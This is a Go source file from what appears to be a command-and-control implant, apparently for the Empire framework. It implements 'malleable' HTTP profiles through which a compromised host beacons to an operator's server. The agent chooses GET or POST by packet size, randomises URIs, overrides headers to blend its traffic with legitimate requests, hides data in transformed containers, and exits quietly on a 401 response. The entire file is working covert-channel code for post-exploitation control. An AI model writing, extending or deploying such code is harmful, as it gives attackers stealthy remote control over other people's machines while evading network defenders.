//go:build malleable

package comms

import (
	"bytes"
	"errors"
	"io"
	"math/rand"
	"net/http"
	"os"
	"strconv"
)

// NewMalleableHttpMessageSender wraps NewHttpMessageSender and additionally
// parses the base64-encoded JSON malleable profile blob, stashing the result
// on sender.malleable so trySendMalleable can route through it.
//
// Only available under `-tags malleable` — non-malleable builds use
// NewHttpMessageSender and get a trySendMalleable stub.
func NewMalleableHttpMessageSender(server string, headers map[string]string, legacyProfile string, malleableB64 string) (*HttpMessageSender, error) {
	sender := NewHttpMessageSender(server, headers, legacyProfile)
	mp, err := ParseMalleableProfile(malleableB64)
	if err != nil {
		return nil, err
	}
	if mp != nil {
		sender.malleable = mp
	}
	return sender, nil
}

// trySendMalleable runs the profile-driven pipeline when a *MalleableProfile
// is attached. Returns handled=false when there is no profile or the profile
// is missing the required section — caller then falls through to legacy.
func (sender *HttpMessageSender) trySendMalleable(routingPacket []byte) (bool, []byte, error) {
	mp, ok := sender.malleable.(*MalleableProfile)
	if !ok || mp == nil {
		return false, nil, nil
	}
	resp, err := sender.sendMalleable(mp, routingPacket)
	return true, resp, err
}

// sendMalleable builds a request from the chosen section of the malleable
// profile, applies the relevant transform pipeline to the routing packet,
// stores it at the configured terminator, executes the request, and reverses
// the server's output container on the response body / header / etc.
//
// Section + container choice mirrors the PS/Python reference agents emitted
// by http_malleable.py::generate_comms:
//   - GET section  → client.Metadata  (the only container GET has)
//   - POST section → client.Output    (Empire convention: the POST routing
//     packet rides on `output`. The `id` / Metadata slot is a server-side
//     extract hint only and is ignored by reference agents. Server's
//     two-part extract concatenates id+output, so placing everything on
//     output yields `b"" + routing_packet = routing_packet` on the wire.)
//
// Size heuristic: small routing packets (< 20 bytes) go through GET (session
// heartbeat / tasking poll); larger ones go through POST.
func (sender *HttpMessageSender) sendMalleable(mp *MalleableProfile, routingPacket []byte) ([]byte, error) {
	sectionName := "get"
	if len(routingPacket) > legacyPostThresholdBytes {
		sectionName = "post"
	}
	section, ok := mp.Sections[sectionName]
	if !ok {
		// Profile missing the section we need — fall back to legacy so the
		// agent can still check in.
		return sender.sendLegacy(routingPacket)
	}
	client := section.Client
	if len(client.URIs) == 0 {
		return sender.sendLegacy(routingPacket)
	}

	verb := client.Verb
	if verb == "" {
		verb = "GET"
	}
	uri := client.URIs[rand.Intn(len(client.URIs))]
	requestURL := sender.Server + uri

	// Seed the request with the section body (profile-defined cover
	// payload). The terminator may overwrite this when it's PRINT. Body
	// is base64-encoded in the profile schema so high-bit bytes survive
	// JSON transport — decode before writing.
	var bodyReader io.Reader
	if client.Body != "" {
		bodyBytes, decodeErr := decodeTransformValue(client.Body)
		if decodeErr != nil {
			sender.MissedCheckins++
			return nil, decodeErr
		}
		if len(bodyBytes) > 0 {
			bodyReader = bytes.NewReader(bodyBytes)
		}
	}

	req, err := http.NewRequest(verb, requestURL, bodyReader)
	if err != nil {
		sender.MissedCheckins++
		return nil, err
	}

	// Static parameters from the profile. Terminator-driven parameters
	// (if metadata uses PARAMETER) will overwrite the specific key.
	if len(client.Parameters) > 0 {
		q := req.URL.Query()
		for k, v := range client.Parameters {
			q.Set(k, v)
		}
		req.URL.RawQuery = q.Encode()
	}

	// Apply sender-level defaults first, then let the profile-declared
	// headers override them. The profile explicitly picks User-Agent (and
	// friends) to blend traffic — letting sender.Headers stomp on that
	// would defeat the whole point of malleable mode.
	for k, v := range sender.Headers {
		req.Header.Set(k, v)
	}
	for k, v := range client.Headers {
		req.Header.Set(k, v)
	}

	// GET carries the routing packet on Metadata; POST on Output (Empire
	// convention — see comment on sendMalleable). Fall back to legacy when
	// the expected container is absent rather than silently dropping the
	// routing packet.
	packetContainer := client.Metadata
	if sectionName == "post" {
		packetContainer = client.Output
	}
	if packetContainer == nil {
		return sender.sendLegacy(routingPacket)
	}
	transformed, err := packetContainer.Apply(routingPacket)
	if err != nil {
		sender.MissedCheckins++
		return nil, err
	}
	if err := StoreTerminator(req, transformed, packetContainer.Terminator); err != nil {
		sender.MissedCheckins++
		return nil, err
	}

	httpClient := &http.Client{}
	resp, err := httpClient.Do(req)
	if err != nil {
		sender.MissedCheckins++
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		sender.MissedCheckins++
		if resp.StatusCode == 401 {
			os.Exit(0)
		}
		// Drain so the connection can be reused.
		_, _ = io.Copy(io.Discard, resp.Body)
		return nil, errors.New(strconv.Itoa(resp.StatusCode))
	}

	// Extract + reverse the server output. A nil server output container
	// means "return raw body" (print / identity).
	if section.Server.Output != nil {
		rawResponseData, err := ExtractTerminator(resp, section.Server.Output.Terminator, client.URIs)
		if err != nil {
			return nil, err
		}
		return section.Server.Output.Reverse(rawResponseData)
	}
	return io.ReadAll(resp.Body)
}
